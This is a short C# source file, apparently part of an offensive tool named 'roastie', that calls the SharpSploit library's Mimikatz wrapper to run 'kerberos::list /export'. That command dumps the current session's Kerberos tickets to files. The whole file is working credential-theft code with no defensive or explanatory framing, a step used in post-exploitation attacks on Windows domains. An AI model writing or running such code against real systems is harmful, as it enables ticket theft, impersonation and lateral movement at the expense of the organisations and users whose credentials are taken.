using System;
using SharpSploit.Credentials;


namespace roastie
{
    class TicketExport
    {

        public static void ExportTickets()
        {
            Console.WriteLine(Mimikatz.Command("\"kerberos::list /export\""));
        }
        
    }

}
